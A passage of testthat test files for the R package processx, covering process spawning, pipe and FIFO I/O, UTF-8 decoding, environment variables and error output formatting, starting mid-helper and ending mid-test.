    error = function(x) "error",
    warning = function(x) "warning",
    message = function(x) "message"
  )
}

get_pid_by_name <- function(name) {
  if (os_type() == "windows") {
    get_pid_by_name_windows(name)
  } else if (is_linux()) {
    get_pid_by_name_linux(name)
  } else {
    get_pid_by_name_unix(name)
  }
}

get_pid_by_name_windows <- function(name) {
  ## TODO
}

## Linux does not exclude the ancestors of the pgrep process
## from the list, so we have to do that manually. We remove every
## process that contains 'pgrep' in its command line, which is
## not the proper solution, but for testing it will do.
##
## Unfortunately Ubuntu 12.04 pgrep does not have a -a switch,
## so we cannot just output the full command line and then filter
## it in R. So we first run pgrep to get all matching process ids
## (without their command lines), and then use ps to list the processes
## again. At this time the first pgrep process is not running any
## more, but another process might have its id, so we filter again the
## result for 'name'

get_pid_by_name_linux <- function(name) {
  ## TODO
}

skip_in_covr <- function() {
  if (Sys.getenv("R_COVR", "") == "true") skip("in covr")
}

httpbin <- webfakes::new_app_process(
  webfakes::httpbin_app(),
  opts = webfakes::server_opts(num_threads = 6)
)

interrupt_me <- function(expr, after = 1) {
  tryCatch(
    {
      p <- callr::r_bg(
        function(pid, after) {
          Sys.sleep(after)
          ps::ps_interrupt(ps::ps_handle(pid))
        },
        list(pid = Sys.getpid(), after = after)
      )
      expr
      p$kill()
    },
    interrupt = function(e) e
  )
}

expect_error <- function(..., class = "error") {
  testthat::expect_error(..., class = class)
}

local_temp_dir <- function(
  pattern = "file",
  tmpdir = tempdir(),
  fileext = "",
  envir = parent.frame()
) {
  path <- tempfile(pattern = pattern, tmpdir = tmpdir, fileext = fileext)
  dir.create(path)
  withr::local_dir(path, .local_envir = envir)
  withr::defer(unlink(path, recursive = TRUE), envir = envir)
  invisible(path)
}

has_locale <- function(l) {
  has <- TRUE
  tryCatch(
    withr::with_locale(c(LC_CTYPE = l), "foobar"),
    warning = function(w) has <<- FALSE,
    error = function(e) has <<- FALSE
  )
  has
}

run_script <- function(expr, ..., quoted = NULL, encoding = "") {
  dir.create(dir <- tempfile())
  sf <- file.path(dir, "script.R")
  sf2 <- file.path(dir, "script2.R")
  so <- paste0(sf, "out")
  se <- paste0(sf, "err")
  on.exit(unlink(c(dir), recursive = TRUE), add = TRUE)

  if (is.null(quoted)) {
    quoted <- substitute(expr)
  }
  writeLines(deparse(quoted), con = sf)

  writeLines(
    deparse(substitute(
      {
        options(keep.source = TRUE)
        source(sf)
      },
      list(sf = basename(sf))
    )),
    con = sf2
  )

  out <- callr::rscript(
    basename(sf2),
    stdout = so,
    stderr = se,
    fail_on_status = FALSE,
    show = FALSE,
    wd = dirname(sf)
  )

  enc <- function(x) iconv(list(x), encoding, "UTF-8")

  list(
    script = readLines(sf),
    stdout = enc(readBin(so, "raw", file.size(so))),
    stderr = enc(readBin(se, "raw", file.size(se))),
    status = out$status
  )
}

scrub_px <- function(x) {
  sub("'px.exe'", "'px'", x, fixed = TRUE)
}

scrub_srcref <- function(x) {
  x <- sub(" at cnd-abort.R:[0-9]+:[0-9]+", "", x)
  x <- sub(" at standalone-errors.R:[0-9]+:[0-9]+", "", x)
  x <- sub(" at run.R:[0-9]+:[0-9]+", "", x)
  x <- sub("\033[90m\033[39m", "", x, fixed = TRUE)
  x
}

transform_tempdir <- function(x) {
  x <- sub(tempdir(), "<tempdir>", x, fixed = TRUE)
  x <- sub(normalizePath(tempdir()), "<tempdir>", x, fixed = TRUE)
  x <- sub(
    normalizePath(tempdir(), winslash = "/"),
    "<tempdir>",
    x,
    fixed = TRUE
  )
  x <- sub("\\R\\", "/R/", x, fixed = TRUE)
  x <- sub("[\\\\/]file[a-zA-Z0-9]+", "/<tempfile>", x)
  x <- sub("[A-Z]:.*Rtmp[a-zA-Z0-9]+[\\\\/]", "<tempdir>/", x)
  x
}

transform_px <- function(x) {
  sub("'.*/px([.]exe)?'", "'<path>/px'", x)
}

transform_column_number <- function(x) {
  sub("([.]R:[0-9]+:)[0-9]+", "\\1<col>", x)
}

transform_line_number <- function(x) {
  sub("([.]R:[0-9]+:)[0-9]+", ".R:<line>:<col>", x)
}

sysname <- function() {
  Sys.info()[["sysname"]]
}

is_asan <- function() {
  .Call(c_is_asan_)
}

is_ubsan <- function() {
  .Call(c_is_ubsan_)
}

is_valgrind <- function() {
  .Call(c_is_valgrind_)
}

is_san <- function() {
  is_asan() || is_ubsan()
}

get_deadline <- function(secs = 1, asan_secs = secs * 100) {
  dl <- if (is_san()) asan_secs else secs
  Sys.time() + as.difftime(dl, units = "secs")
}

err$register_testthat_print()
````

### `px390/processx/tests/testthat/test-assertions.R`

````r
strings <- list("foo", "", "111", "1", "-", "NA")
not_strings <- list(
  1,
  character(),
  NA_character_,
  NA,
  c("foo", NA),
  c("1", "2"),
  NULL
)

test_that("is_string", {
  for (p in strings) {
    expect_true(is_string(p))
    expect_silent(assert_that(is_string(p)))
  }

  for (n in not_strings) {
    expect_false(is_string(n))
    expect_snapshot(error = TRUE, assert_that(is_string(n)))
  }
})

test_that("is_string_or_null", {
  for (p in strings) {
    expect_true(is_string_or_null(p))
    expect_silent(assert_that(is_string_or_null(p)))
  }
  expect_true(is_string_or_null(NULL))
  expect_silent(assert_that(is_string_or_null(NULL)))

  for (n in not_strings) {
    if (!is.null(n)) {
      expect_false(is_string_or_null(n))
      expect_snapshot(error = TRUE, assert_that(is_string_or_null(n)))
    }
  }
})

flags <- list(TRUE, FALSE)
not_flags <- list(
  1,
  character(),
  NA_character_,
  NA,
  c("foo", NA),
  c("1", "2"),
  NULL
)

test_that("is_flag", {
  for (p in flags) {
    expect_true(is_flag(p))
    expect_silent(assert_that(is_flag(p)))
  }

  for (n in not_flags) {
    expect_false(is_flag(n))
    expect_snapshot(error = TRUE, assert_that(is_flag(n)))
  }
})

ints <- list(1, 0, -1, 1L, 0L, -1L, 1.0, 42.0)
not_ints <- list(
  1.2,
  0.1,
  "foo",
  numeric(),
  integer(),
  NULL,
  NA_integer_,
  NA_real_
)

test_that("is_integerish_scalar", {
  for (p in ints) {
    expect_true(is_integerish_scalar(p))
    expect_silent(assert_that(is_integerish_scalar(p)))
  }

  for (n in not_ints) {
    expect_false(is_integerish_scalar(n))
    expect_snapshot(error = TRUE, assert_that(is_integerish_scalar(n)))
  }
})

test_that("is_pid", {
  for (p in ints) {
    expect_true(is_pid(p))
    expect_silent(assert_that(is_pid(p)))
  }

  for (n in not_ints) {
    expect_false(is_pid(n))
    expect_snapshot(error = TRUE, assert_that(is_pid(n)))
  }
})

test_that("is_flag_or_string", {
  for (p in c(flags, strings)) {
    expect_true(is_flag_or_string(p))
    expect_silent(assert_that(is_flag_or_string(p)))
  }

  for (n in intersect(not_flags, not_strings)) {
    expect_false(is_flag_or_string(n))
    expect_snapshot(error = TRUE, assert_that(is_flag_or_string(n)))
  }
})

test_that("is_existing_file", {
  expect_false(is_existing_file(tempfile()))
  expect_snapshot(error = TRUE, assert_that(is_existing_file(tempfile())))

  cat("foo\n", file = tmp <- tempfile())
  on.exit(unlink(tmp), add = TRUE)
  expect_true(is_existing_file(tmp))
  expect_silent(assert_that(is_existing_file(tmp)))
})
````

### `px390/processx/tests/testthat/test-chr-io.R`

````r
test_that("Can read last line without trailing newline", {
  px <- get_tool("px")

  p <- process$new(px, c("out", "foobar"), stdout = "|")
  on.exit(p$kill(), add = TRUE)
  out <- p$read_all_output_lines()
  expect_equal(out, "foobar")
})

test_that("Can read single characters", {
  px <- get_tool("px")

  p <- process$new(px, c("out", "123"), stdout = "|")
  on.exit(p$kill(), add = TRUE)
  p$wait()

  p$poll_io(-1)
  expect_equal(p$read_output(1), "1")
  expect_equal(p$read_output(1), "2")
  expect_equal(p$read_output(1), "3")
  expect_equal(p$read_output(1), "")
  expect_false(p$is_incomplete_output())
})

test_that("Can read multiple characters", {
  px <- get_tool("px")

  p <- process$new(px, c("out", "123456789"), stdout = "|")
  on.exit(p$kill(), add = TRUE)
  p$wait()

  p$poll_io(-1)
  expect_equal(p$read_output(3), "123")
  expect_equal(p$read_output(4), "4567")
  expect_equal(p$read_output(2), "89")
  expect_equal(p$read_output(1), "")
  expect_false(p$is_incomplete_output())
})
````

### `px390/processx/tests/testthat/test-cleanup.R`

````r
test_that("process is cleaned up", {
  px <- get_tool("px")
  p <- process$new(px, c("sleep", "1"), cleanup = TRUE)
  pid <- p$get_pid()

  rm(p)
  gc()

  expect_false(process__exists(pid))
})

test_that("process can stay alive", {
  px <- get_tool("px")

  on.exit(tools::pskill(pid, 9), add = TRUE)
  p <- process$new(px, c("sleep", "60"), cleanup = FALSE)
  pid <- p$get_pid()

  rm(p)
  gc()

  expect_true(process__exists(pid))
})
````

### `px390/processx/tests/testthat/test-client-lib.R`

````r
test_that("client lib is standalone", {
  lib <- load_client_lib(client)
  on.exit(try(lib$.finalize()), add = TRUE)

  objs <- ls(lib, all.names = TRUE)
  funs <- Filter(function(x) is.function(lib[[x]]), objs)
  funobjs <- mget(funs, lib)
  for (f in funobjs) {
    expect_identical(environmentName(topenv(f)), "base")
  }

  skip_if_not_installed("codetools")
  expect_message(
    mapply(
      codetools::checkUsage,
      funobjs,
      funs,
      MoreArgs = list(report = message)
    ),
    NA
  )
})

test_that("base64", {
  lib <- load_client_lib(client)
  on.exit(try(lib$.finalize()), add = TRUE)

  expect_equal(lib$base64_encode(charToRaw("foobar")), "Zm9vYmFy")
  expect_equal(lib$base64_encode(charToRaw(" ")), "IA==")
  expect_equal(lib$base64_encode(charToRaw("")), "")

  x <- charToRaw(paste(sample(letters, 10000, replace = TRUE), collapse = ""))
  expect_equal(lib$base64_decode(lib$base64_encode(x)), x)

  for (i in 5:32) {
    mtcars2 <- unserialize(lib$base64_decode(lib$base64_encode(
      serialize(mtcars[1:i, ], NULL)
    )))
    expect_identical(mtcars[1:i, ], mtcars2)
  }
})

test_that("disable_inheritance", {
  ## TODO
  expect_true(TRUE)
})

test_that("write_fd", {
  lib <- load_client_lib(client)
  on.exit(try(lib$.finalize()), add = TRUE)

  tmp <- tempfile(fileext = ".rds")
  on.exit(unlink(tmp), add = TRUE)

  conn <- conn_create_file(tmp, read = FALSE, write = TRUE)
  fd <- conn_get_fileno(conn)

  obj <- runif(100000)
  data <- serialize(obj, connection = NULL)
  lib$write_fd(fd, data)
  close(conn)

  expect_identical(readRDS(tmp), obj)
})

test_that("processx_connection_set_stdout", {
  stdout_to_file <- function(filename) {
    lib <- asNamespace("processx")$load_client_lib(processx:::client)
    lib$set_stdout_file(filename)
    cat("output\n")
    message("error")
    42
  }

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  opt <- callr::r_process_options(
    func = stdout_to_file,
    args = list(filename = tmp)
  )
  on.exit(p$kill(), add = TRUE)
  p <- callr::r_process$new(opt)

  p$wait(5000)
  expect_false(p$kill(close_connections = FALSE))
  expect_equal(p$get_result(), 42)
  expect_equal(p$read_all_error_lines(), "error")
  expect_equal(p$read_all_output_lines(), character())
  expect_equal(readLines(tmp), "output")
  p$kill()
})

test_that("processx_connection_set_stdout", {
  stderr_to_file <- function(filename) {
    lib <- asNamespace("processx")$load_client_lib(processx:::client)
    lib$set_stderr_file(filename)
    cat("output\n")
    message("error")
    42
  }

  tmp <- tempfile()
  on.exit(unlink(tmp), add = TRUE)
  opt <- callr::r_process_options(
    func = stderr_to_file,
    args = list(filename = tmp)
  )
  on.exit(p$kill(), add = TRUE)
  p <- callr::r_process$new(opt)

  p$wait(5000)
  expect_false(p$kill(close_connections = FALSE))
  expect_equal(p$get_result(), 42)
  expect_equal(p$read_all_output_lines(), "output")
  expect_equal(p$read_all_error_lines(), character())
  expect_equal(readLines(tmp), "error")
  p$kill()
})

test_that("setting stdout multiple times", {
  stdout_to_file <- function(file1, file2) {
    lib <- asNamespace("processx")$load_client_lib(processx:::client)
    lib$set_stdout_file(file1)
    cat("output\n")
    message("error")

    lib$set_stdout_file(file2)
    cat("output2\n")
    message("error2")

    42
  }

  tmp1 <- tempfile()
  tmp2 <- tempfile()
  on.exit(unlink(c(tmp1, tmp2)), add = TRUE)
  opt <- callr::r_process_options(
    func = stdout_to_file,
    args = list(file1 = tmp1, file2 = tmp2)
  )
  on.exit(p$kill(), add = TRUE)
  p <- callr::r_process$new(opt)

  p$wait(5000)
  expect_false(p$kill(close_connections = FALSE))
  expect_equal(p$get_result(), 42)
  expect_equal(p$read_all_error_lines(), c("error", "error2"))
  expect_equal(p$read_all_output_lines(), character())
  expect_equal(readLines(tmp1), "output")
  expect_equal(readLines(tmp2), "output2")
  p$kill()
})
````

### `px390/processx/tests/testthat/test-connections.R`

````r
if (!is.null(packageDescription("stats")[["ExperimentalWindowsRuntime"]])) {
  if (!identical(Sys.getenv("NOT_CRAN"), "true")) return()
}

test_that("lot of text", {
  px <- get_tool("px")
  txt <- strrep("x", 100000)
  cat(txt, file = tmp <- tempfile())

  p <- process$new(px, c("cat", tmp), stdout = "|")
  on.exit(p$kill(), add = TRUE)
  out <- p$read_all_output_lines()

  expect_equal(txt, out)
})

test_that("UTF-8", {
  px <- get_tool("px")
  txt <- charToRaw(strrep("\xc2\xa0\xe2\x86\x92\xf0\x90\x84\x82", 20000))
  writeBin(txt, con = tmp <- tempfile())

  p <- process$new(px, c("cat", tmp), stdout = "|", encoding = "UTF-8")
  on.exit(p$kill(), add = TRUE)
  out <- p$read_all_output_lines()

  expect_equal(txt, charToRaw(out))
})

test_that("UTF-8 multibyte character cut in half", {
  px <- get_tool("px")

  rtxt <- charToRaw("a\xc2\xa0a")

  writeBin(rtxt[1:2], tmp1 <- tempfile())
  writeBin(rtxt[3:4], tmp2 <- tempfile())

  p1 <- process$new(
    px,
    c("cat", tmp1, "cat", tmp2),
    stdout = "|",
    encoding = "UTF-8"
  )
  on.exit(p1$kill(), add = TRUE)
  out <- p1$read_all_output_lines()
  expect_equal(rtxt, charToRaw(out))

  cmd <- paste("(cat", shQuote(tmp1), ";sleep 1;cat", shQuote(tmp2), ")")
  p2 <- process$new(
    px,
    c("cat", tmp1, "sleep", "1", "cat", tmp2),
    stdout = "|",
    stderr = "|",
    encoding = "UTF-8"
  )
  on.exit(p2$kill(), add = TRUE)
  out <- p2$read_all_output_lines()
  expect_equal(rtxt, charToRaw(out))
})

test_that("UTF-8 multibyte character cut in half at the end of the file", {
  px <- get_tool("px")
  rtxt <- charToRaw("a\xc2\xa0a")
  writeBin(c(rtxt, rtxt[1:2]), tmp1 <- tempfile())

  p <- process$new(px, c("cat", tmp1), stdout = "|", encoding = "UTF-8")
  on.exit(p$kill(), add = TRUE)
  expect_warning(
    out <- p$read_all_output_lines(),
    "Invalid multi-byte character at end of stream ignored"
  )
  expect_equal(charToRaw(out), c(rtxt, rtxt[1]))
})

test_that("Invalid UTF-8 characters in the middle of the string", {
  px <- get_tool("px")
  half <- charToRaw("\xc2\xa0")[1]
  rtxt <- sample(rep(c(half, charToRaw("a")), 100))
  writeBin(rtxt, tmp1 <- tempfile())

  p <- process$new(px, c("cat", tmp1), stdout = "|", encoding = "UTF-8")
  on.exit(p$kill(), add = TRUE)
  suppressWarnings(out <- p$read_all_output_lines())

  expect_equal(out, strrep("a", 100))
})

test_that("Convert from another encoding to UTF-8", {
  px <- get_tool("px")

  latin1 <- "\xe1\xe9\xed"
  writeBin(charToRaw(latin1), tmp1 <- tempfile())

  p <- process$new(px, c("cat", tmp1), stdout = "|", encoding = "latin1")
  on.exit(p$kill(), add = TRUE)
  suppressWarnings(out <- p$read_all_output_lines())

  expect_equal(charToRaw(out), charToRaw("\xc3\xa1\xc3\xa9\xc3\xad"))
})

test_that("Passing connection to stdout", {
  # file first
  tmp <- tempfile()
  con <- conn_create_file(tmp, write = TRUE)
  on.exit(try(close(con), silent = TRUE), add = TRUE)
  cmd <- c(get_tool("px"), c("outln", "hello", "outln", "world"))

  p <- process$new(cmd[1], cmd[-1], stdout = con)
  on.exit(p$kill(), add = TRUE)

  p$wait(3000)
  expect_false(p$is_alive())
  # Need to close here, otherwise Windows cannot read it
  close(con)

  out <- readLines(tmp)
  expect_equal(out, c("hello", "world"))

  # pass a pipe to write to
  pipe <- conn_create_pipepair()
  on.exit(close(pipe[[1]]), add = TRUE)
  on.exit(close(pipe[[2]]), add = TRUE)

  p2 <- process$new(cmd[1], cmd[-1], stdout = pipe[[2]])
  on.exit(p2$kill(), add = TRUE)

  ready <- poll(list(pipe[[1]]), 3000)
  expect_equal(ready[[1]], "ready")
  lines <- conn_read_lines(pipe[[1]])
  # sometimes it takes more tried to read everything.
  deadline <- Sys.time() + as.difftime(3, units = "secs")
  while (Sys.time() < deadline && length(lines) < 2) {
    poll(list(pipe[[1]]), 1000)
    lines <- c(lines, conn_read_lines(pipe[[1]]))
  }
  expect_equal(lines, c("hello", "world"))
  p2$wait(3000)
  expect_false(p2$is_alive())
})

test_that("Passing connection to stderr", {
  # file first
  tmp <- tempfile()
  con <- conn_create_file(tmp, write = TRUE)
  cmd <- c(get_tool("px"), c("errln", "hello", "errln", "world"))

  p <- process$new(cmd[1], cmd[-1], stderr = con)
  on.exit(p$kill(), add = TRUE)
  close(con)

  p$wait(3000)
  expect_false(p$is_alive())

  err <- readLines(tmp)
  expect_equal(err, c("hello", "world"))

  # pass a pipe to write to
  pipe <- conn_create_pipepair()
  on.exit(close(pipe[[1]]), add = TRUE)
  on.exit(close(pipe[[2]]), add = TRUE)

  p2 <- process$new(cmd[1], cmd[-1], stderr = pipe[[2]])
  on.exit(p2$kill(), add = TRUE)
  close(pipe[[2]])

  ready <- poll(list(pipe[[1]]), 3000)
  expect_equal(ready[[1]], "ready")
  lines <- conn_read_lines(pipe[[1]])
  # sometimes it takes more tried to read everything.
  deadline <- Sys.time() + as.difftime(3, units = "secs")
  while (Sys.time() < deadline && length(lines) < 2) {
    poll(list(pipe[[1]]), 1000)
    lines <- c(lines, conn_read_lines(pipe[[1]]))
  }
  expect_equal(lines, c("hello", "world"))
  p2$wait(3000)
  expect_false(p2$is_alive())
})
````

### `px390/processx/tests/testthat/test-env.R`

````r
test_that("inherit by default", {
  v <- basename(tempfile())
  if (os_type() == "unix") {
    cmd <- c("bash", "-c", paste0("echo $", v))
  } else {
    cmd <- c("cmd", "/c", paste0("echo %", v, "%"))
  }

  skip_if_no_tool(cmd[1])

  out <- run(cmd[1], cmd[-1])
  expect_true(out$stdout %in% c("\n", paste0("%", v, "%\r\n")))
  gc()
})

test_that("specify custom env", {
  v <- c(basename(tempfile()), basename(tempfile()))
  if (os_type() == "unix") {
    cmd <- c("bash", "-c", paste0("echo ", paste0("$", v, collapse = " ")))
  } else {
    cmd <- c("cmd", "/c", paste0("echo ", paste0("%", v, "%", collapse = " ")))
  }

  skip_if_no_tool(cmd[1])

  out <- run(cmd[1], cmd[-1], env = structure(c("bar", "baz"), names = v))
  expect_true(out$stdout %in% paste0("bar baz", c("\n", "\r\n")))
  gc()
})

test_that("env = 'current' inherits current env", {
  withr::local_envvar(FOO = "fooe")
  px <- get_tool("px")
  out <- run(px, c("getenv", "FOO"), env = "current")
  outenv <- strsplit(out$stdout, "\r?\n")[[1]]
  expect_equal(outenv, "fooe")
})

test_that("append to env", {
  withr::local_envvar(FOO = "fooe", BAR = "bare")
  px <- get_tool("px")
  out <- run(
    px,
    c("getenv", "FOO", "getenv", "BAR", "getenv", "BAZ"),
    env = c("current", BAZ = "baze", BAR = "bare2")
  )

  outenv <- strsplit(out$stdout, "\r?\n")[[1]]
  expect_equal(outenv, c("fooe", "bare2", "baze"))
})
````

### `px390/processx/tests/testthat/test-err-output.R`

````r
test_that("simple error", {
  out <- run_script({
    f <- function() processx:::throw("This failed")
    f()
  })
  expect_snapshot(cat(out$stderr))

  out <- run_script({
    options(rlib_interactive = TRUE)
    f <- function() processx:::throw("This failed")
    f()
  })
  expect_snapshot(cat(out$stdout))
})

test_that("simple error with cli", {
  out <- run_script({
    library(cli)
    f <- function() processx:::throw("This failed")
    f()
  })
  expect_snapshot(cat(out$stderr))

  out <- run_script({
    options(rlib_interactive = TRUE)
    library(cli)
    f <- function() processx:::throw("This failed")
    f()
  })
  expect_snapshot(cat(out$stdout))
})

test_that("simple error with cli and colors", {
  cli <- if (packageVersion("cli") >= "3.6.3") "newcli" else "oldcli"
  out <- run_script({
    library(cli)
    options(cli.num_colors = 256)
    f <- function() processx:::throw("This failed")
    f()
  })
  expect_snapshot(cat(out$stderr), variant = cli)

  out <- run_script({
    library(cli)
    options(rlib_interactive = TRUE)
    options(cli.num_colors = 256)
    f <- function() processx:::throw("This failed")
    f()
  })
  expect_snapshot(cat(out$stdout), variant = cli)
})

test_that("chain_error", {
  expr <- quote({
    options(cli.unicode = FALSE)
    do3 <- function() {
      processx:::throw("because of this")
    }

    do2 <- function() {
      processx:::chain_error(do3(), "something is wrong here")
    }

    do <- function() {
      processx:::chain_error(do2(), "Failed to base64 encode")
    }

    f <- function() g()
    g <- function() h()
    h <- function() do()
    f()
  })

  out <- run_script(quoted = expr)
  expect_snapshot(cat(out$stderr), transform = scrub_srcref)

  expr2 <- substitute(
    {
      o
      c
    },
    list(o = quote(options(rlib_interactive = TRUE)), c = expr)
  )
  out <- run_script(quoted = expr2)
  expect_snapshot(cat(out$stdout))

  expr2 <- substitute(
    {
      o
      c
    },
    list(o = quote(library(cli)), c = expr)
  )
  out <- run_script(quoted = expr2)
  expect_snapshot(cat(out$stderr), transform = scrub_srcref)

  expr2 <- substitute(
    {
      o
      c
    },
    list(
      o = quote({
        library(cli)
        options(cli.num_colors = 256)
      }),
      c = expr
    )
  )
  out <- run_script(quoted = expr2)
  cli <- if (packageVersion("cli") >= "3.6.3") "newcli" else "oldcli"
  expect_snapshot(cat(out$stderr), transform = scrub_srcref, variant = cli)
})

test_that("chain_error with stop()", {
  expr <- quote({
    do3 <- function() {
      stop("because of this")
    }

    do2 <- function() {
      processx:::chain_error(do3(), "something is wrong here")
    }

    do <- function() {
      processx:::chain_error(do2(), "Failed to base64 encode")
    }

    f <- function() g()
    g <- function() h()
    h <- function() do()
    f()
  })

  out <- run_script(quoted = expr)
  expect_snapshot(cat(out$stderr), transform = scrub_srcref)

  expr2 <- substitute(
    {
      o
      c
    },
    list(o = quote(options(rlib_interactive = TRUE)), c = expr)
  )
  out <- run_script(quoted = expr2)
  expect_snapshot(cat(out$stdout))
})

test_that("chain_error with rlang::abort()", {
  expr <- quote({
    options(cli.unicode = FALSE)
    do3 <- function() {
      rlang::abort("because of this")
    }

    do2 <- function() {
      processx:::chain_error(do3(), "something is wrong here")
    }

    do <- function() {
      processx:::chain_error(do2(), "Failed to base64 encode")
    }

    f <- function() g()
    g <- function() h()
    h <- function() do()
    f()
  })

  out <- run_script(quoted = expr)
  expect_snapshot(cat(out$stderr), transform = scrub_srcref)

  expr2 <- substitute(
    {
      o
      c
    },
    list(o = quote(options(rlib_interactive = TRUE)), c = expr)
  )
  out <- run_script(quoted = expr2)
  expect_snapshot(cat(out$stdout))
})

test_that("full parent error is printed in non-interactive mode", {
  expr <- quote({
    options(cli.unicode = FALSE)
    px <- processx:::get_tool("px")
    processx:::chain_error(
      processx::run(px, c("return", "1")),
      "failed to run external program"
    )
  })

  out <- run_script(quoted = expr)
  expect_snapshot(
    cat(out$stderr),
    transform = function(x) scrub_px(scrub_srcref(x))
  )

  expr2 <- substitute(
    {
      o
      c
    },
    list(o = quote(options(rlib_interactive = TRUE)), c = expr)
  )
  out <- run_script(quoted = expr2)
  expect_snapshot(
    cat(out$stdout),
    transform = function(x) scrub_px(scrub_srcref(x))
  )

  expr2 <- substitute(
    {
      o
      c
    },
    list(o = quote(library(cli)), c = expr)
  )
  out <- run_script(quoted = expr2)
  expect_snapshot(
    cat(out$stderr),
    transform = function(x) scrub_px(scrub_srcref(x))
  )

  expr2 <- substitute(
    {
      o
      c
    },
    list(
      o = quote({
        library(cli)
        options(cli.num_colors = 256)
      }),
      c = expr
    )
  )
  out <- run_script(quoted = expr2)
  cli <- if (packageVersion("cli") >= "3.6.3") "newcli" else "oldcli"
  expect_snapshot(
    cat(out$stderr),
    transform = function(x) scrub_px(scrub_srcref(x)),
    variant = cli
  )
})
````

### `px390/processx/tests/testthat/test-errors.R`

````r
test_that("run() prints stderr if echo = FALSE", {
  px <- get_tool("px")
  err <- tryCatch(
    run(
      px,
      c("outln", "nopppp", "errln", "bad", "errln", "foobar", "return", "2")
    ),
    error = function(e) e
  )
  expect_true(any(grepl("foobar", format(err))))
  expect_false(any(grepl("nopppp", conditionMessage(err))))
})

test_that("run() omits stderr if echo = TRUE", {
  px <- get_tool("px")
  err <- tryCatch(
    capture.output(
      run(px, c("errln", "bad", "errln", "foobar", "return", "2"), echo = TRUE)
    ),
    error = function(e) e
  )
  expect_false(any(grepl("foobar", conditionMessage(err))))
})

test_that("run() handles stderr_to_stdout = TRUE properly", {
  px <- get_tool("px")
  err <- tryCatch(
    run(
      px,
      c("outln", "nopppp", "errln", "bad", "errln", "foobar", "return", "2"),
      stderr_to_stdout = TRUE
    ),
    error = function(e) e
  )
  expect_true(any(grepl("foobar", format(err))))
  expect_true(any(grepl("nopppp", format(err))))
})

test_that("run() only prints the last 10 lines of stderr", {
  px <- get_tool("px")
  args <- rbind("errln", paste0("foobar", 1:11, "--"))
  withr::with_options(
    list(rlib_interactive = TRUE),
    ferr <- format(tryCatch(
      run(px, c(args, "return", "2")),
      error = function(e) e
    ))
  )
  expect_false(any(grepl("foobar1--", ferr)))
  expect_true(any(grepl("foobar2--", ferr)))
  expect_true(any(grepl("foobar11--", ferr)))
})

test_that("prints full stderr in non-interactive mode", {
  script <- tempfile(fileext = ".R")
  on.exit(unlink(script, recursive = TRUE), add = TRUE)

  code <- quote({
    px <- asNamespace("processx")$get_tool("px")
    args <- rbind("errln", paste0("foobar", 1:20, "--"))
    processx::run(px, c(args, "return", "2"))
  })
  cat(deparse(code), file = script, sep = "\n")

  out <- callr::rscript(script, fail_on_status = FALSE, show = FALSE)
  expect_match(out$stderr, "foobar1--")
  expect_match(out$stderr, "foobar20--")
})

test_that("output from error", {
  out <- run_script({
    processx::run(
      processx:::get_tool("px"),
      c("errln", paste(1:20, collapse = "\n"), "return", "100")
    )
  })

  expect_snapshot(
    cat(out$stderr),
    transform = function(x) scrub_px(scrub_srcref(x))
  )
})
````

### `px390/processx/tests/testthat/test-extra-connections.R`

````r
test_that("writing to extra connection", {
  skip_on_cran()

  msg <- "foobar"
  cmd <- c(get_tool("px"), "echo", "3", "1", nchar(msg))

  pipe <- conn_create_pipepair(nonblocking = c(FALSE, FALSE))

  expect_silent(
    p <- process$new(
      cmd[1],
      cmd[-1],
      stdout = "|",
      stderr = "|",
      connections = list(pipe[[1]])
    )
  )
  close(pipe[[1]])
  on.exit(p$kill(), add = TRUE)

  conn_write(pipe[[2]], msg)
  p$poll_io(-1)
  expect_equal(p$read_all_output_lines(), msg)
  expect_equal(p$read_all_error_lines(), character())
  close(pipe[[2]])
})

test_that("reading from extra connection", {
  skip_on_cran()

  cmd <- c(
    get_tool("px"),
    "sleep",
    "0.5",
    "write",
    "3",
    "foobar\r\n",
    "out",
    "ok"
  )

  pipe <- conn_create_pipepair()

  expect_silent(
    p <- process$new(
      cmd[1],
      cmd[-1],
      stdout = "|",
      stderr = "|",
      connections = list(pipe[[2]])
    )
  )
  close(pipe[[2]])
  on.exit(p$kill(), add = TRUE)

  ## Nothing to read yet
  expect_equal(conn_read_lines(pipe[[1]]), character())

  ## Wait until there is output
  ready <- poll(list(pipe[[1]]), 5000)[[1]]
  expect_equal(ready, "ready")
  expect_equal(conn_read_lines(pipe[[1]]), "foobar")
  expect_equal(p$read_all_output_lines(), "ok")
  expect_equal(p$read_all_error_lines(), character())
  close(pipe[[1]])
})

test_that("reading and writing to extra connection", {
  skip_on_cran()

  msg <- "foobar\n"
  cmd <- c(get_tool("px"), "echo", "3", "4", nchar(msg), "outln", "ok")

  pipe1 <- conn_create_pipepair(nonblocking = c(FALSE, FALSE))
  pipe2 <- conn_create_pipepair()

  expect_silent(
    p <- process$new(
      cmd[1],
      cmd[-1],
      stdout = "|",
      stderr = "|",
      connections = list(pipe1[[1]], pipe2[[2]])
    )
  )
  close(pipe1[[1]])
  close(pipe2[[2]])

  on.exit(p$kill(), add = TRUE)

  conn_write(pipe1[[2]], msg)
  p$poll_io(-1)
  expect_equal(conn_read_chars(pipe2[[1]]), msg)
  expect_equal(p$read_output_lines(), "ok")
  close(pipe1[[2]])
  close(pipe2[[1]])
})
````

### `px390/processx/tests/testthat/test-fifo.R`

````r
test_that("read end first", {
  skip_on_cran()

  fifo <- tempfile()
  on.exit(unlink(fifo), add = TRUE)
  if (is_windows()) {
    fifo <- basename(fifo)
  }

  reader <- conn_create_fifo(fifo)
  expect_equal(
    poll(list(reader), 10),
    list("timeout")
  )
  expect_true(conn_is_incomplete(reader))
  expect_true(ends_with(conn_file_name(reader), basename(fifo)))

  writer <- conn_connect_fifo(fifo, write = TRUE)
  expect_true(ends_with(conn_file_name(writer), basename(fifo)))
  expect_equal(
    conn_write(writer, "hello\nthere\n"),
    raw(0)
  )

  expect_equal(
    poll(list(reader), 1000),
    list("ready")
  )

  # Windows might read nothing the first time
  line <- conn_read_lines(reader, 1)
  if (!length(line)) {
    line <- conn_read_lines(reader, 1)
  }
  expect_equal(line, "hello")

  rest <- conn_read_chars(reader)
  expect_equal(rest, "there\n")

  expect_true(conn_is_incomplete(reader))
  expect_true(conn_is_incomplete(writer))

  close(writer)
  expect_equal(
    conn_read_lines(reader),
    character()
  )
  expect_false(conn_is_incomplete(reader))
})

test_that("write end first", {
  skip_on_cran()

  writer <- conn_create_fifo(write = TRUE)
  # this currently fails on Windows if there is no reader attached
  # we'll fix this eventually
  if (is_windows()) {
    expect_error(conn_write(writer, "testing\n"))
  }
  expect_true(conn_is_incomplete(writer))

  reader <- conn_connect_fifo(conn_file_name(writer))
